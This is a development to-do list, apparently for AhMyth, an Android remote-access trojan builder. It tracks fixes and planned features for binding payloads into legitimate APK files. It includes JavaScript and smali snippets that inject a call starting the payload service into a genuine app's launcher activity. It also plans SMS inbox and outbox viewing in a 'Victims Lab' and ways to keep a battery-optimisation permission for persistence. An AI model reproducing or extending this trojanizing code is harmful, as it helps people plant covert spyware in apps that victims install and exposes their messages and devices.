## <div align="center"><ins>Stability Updates</ins></div>

- [x] 01: Figure out why AhMyth is so unstable on Windows machines!

- Done! Was due to outdated coding in the `main.js` file, as well as a bug in the Modification of a legit APK file's Launcher Activity when utilising the `On Launch` binding method, the framework directory for Apktool was also causing problems as well, so this has been fixed using a child process before building each APK Payload.
#
- [ ] 02: Merge Client & Server upgrades from [@HiddenPirates](https://github.com/HiddenPirates) and then integrate the Java code responisble for allowing the new hook function to work
#
- [ ] 03: Replace the exported `orgAppKey` variable in the `Constants.js` file, with the new hook point variable...
```js
exports.hookPoint = '\n\n' + 
'return-void";
```
...then replace the exported `serviceSrc` variable in the `Constants.js` file, with the new static hook metbod...
```js
exports.serviceSrc = '\n\n' +
'invoke-static {}, L';
```
...then replace the exported `serviceStart` variable in the `Constants.js` file....
```js
exports.serviceStart = ';->start()V' +
'\n\n' +
'return-void';
```
....then replace the the old `onCreate` hook point code, with the new code for the new static hook function.
```js
var regex = /\/(\S+)\./;
var str = launcherPath;
var m = str.match(regex);

var startService = serviceSrc + m[1] + serviceStart;

var key = CONSTANTS.hookPoint;
$appCtrl.Log("Modifiying Launcher Activity...");
$appCtrl.Log();

var output = data.substring(0, data.indexOf(key) + key.length) + startService + data.substring(data.indexOf(key) + key.length);
fs.writeFile(path.join(apkFolder, launcherPath), output, 'utf8', (error) => {
    if (error) {
        $appCtrl.Log('Modifying Launcher Activity Failed!', CONSTANTS.logStatus.FAIL);
        $appCtrl.Log();
        return;
    }
```
#
- [x] 04: Figure out how to allow AhMyth to search `smali_classes` directories, 
if the launcher activity is not present anywhere in the `smali` directory.

- Done For Windows, Linux & macOS! A new cross platform `Bind On Launch` function has been implemented which fixes major bugs & previous limitations for Windows, macOS & Linux.
#
- [ ] 05. Stabilise the SMS feature by adding the ability to view sent SMS's in an `Outbox SMS` sub-tab next to a separate `Inbox SMS` sub-tab when using the Victims Lab's SMS feature, a small example of this can be seen below.
```
|--| SMS |
|----| Send an SMS |
|------| Inbox || Outbox |
```
#
- [ ] 06: Fix the binaries for 1.0-Beta.4 Release!
#
- [ ] 07: Implement the `REQUEST_IGNORE_BATTERY_OPTIMISATION` manifest permission in such a way where it wont be replaced when using the `Custom Permissions` feature.
#
- [ ] 08: Update the autoinstall script to install AhMyth based on the current supported OS's if they're detected after running the script, the script should also check to see if the required dependencies are installed, and install them if they're aren't.
#
- [ ] 09: Move the JavaScript code for the `Custom Permissions` feature to a seperate file in such a way that its able to be properly exported and used by the `AppCtrl.js` file when any of this feature's checkboxes return true/checked.
